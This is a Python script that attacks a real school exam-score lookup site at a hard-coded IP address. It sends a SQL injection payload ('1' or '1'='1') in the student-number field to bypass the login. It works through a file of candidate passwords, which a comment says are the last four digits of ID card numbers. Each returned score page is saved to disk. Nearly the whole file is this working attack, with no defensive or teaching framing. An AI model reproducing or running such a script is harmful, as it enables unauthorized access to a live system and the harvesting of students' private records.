import os,requests,bs4
from bs4 import BeautifulSoup

# there datas are constant   -------------
# inquiry score URL: http://61.185.143.11:888/qmkscjcx/
# 登录密码为身份证号码后4位

url = 'http://61.185.143.11:888/qmkscjcx/view.asp'
headers = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding':'gzip, deflate',
           'Accept-Language':'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
           'Cache-Control':'max-age=0',
           'Connection':'keep-alive',
           'Content-Length':'55',
           'Content-Type':'application/x-www-form-urlencoded',
           'Host':'61.185.143.11:888',
           'Origin':'http://61.185.143.11:888',
           'Referer':'http://61.185.143.11:888/qmkscjcx/',
           'Upgrade-Insecure-Requests':'1',
           'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'
           }


#   get html  ---------------------
def get_html(password,validatecode,cookie):
#   password = str('0311')
#   This case is inqury 2018-2019 score,if you want to inqury other ,please edit it
#   &XN=2018-2019&XQ=2
#   XN=2018-2019 :year
#   XQ=2         :term
#   Everytime the cookie-key may by change,please edit it
    validatecode = str(validatecode)
    data = "XH=1' or '1' ='1&MM=" + password + "&XN=2018-2019&XQ=2&validatecode=" + validatecode
    cookies = {'curMM':password, 
               'curXH':'17093112', 
               'ASPSESSIONIDSCTDCAAD':cookie
               }

    rs = requests.post(url,data=data,cookies=cookies,headers=headers)
    rs.encoding = rs.apparent_encoding
    return rs.text


#    parser html         ------------
def parser_html(html):
    soup = BeautifulSoup(html,'html.parser')
    soup = soup.prettify()
    return(soup)



#    save html       - ---------------
def save_html(html,number):
    if os.path.isdir('html'):
        pass
    else:
        os.mkdir('html')

    path = './html/' + str(number) + '.html'
    with open(path,'w+',encoding='utf-8') as file:
        file.write(html)

# progress bar       -----------------
def progress_bar(number,counts):
    counts = str(counts)
    number = str(number + 1)
    print('\r' + 'finished:'+ number + '   counts:' + counts)


#   main          --------------------
def main():

    #read password
    with open('password.txt','r') as files:
        list = files.readlines()
        
    #delete ENTER
    for i in range(0,len(list)):
        list[i] = list[i].rstrip('\n')

    counts = len(list)

    #start_place
    start_place = int(input("please input begin place(1-1100):"))
    start_place -= 1

    #input validatecode and cookie
    validatecode = input("please input validatecode:")
    cookie = input("please input cookie:")

    for number in range(start_place,counts):

        #get
        html = get_html(list[number],validatecode,cookie)
        #parser
        html = parser_html(html)
        #save
        save_html(html,number)
        #progress bar
        progress_bar(number,counts)


main()





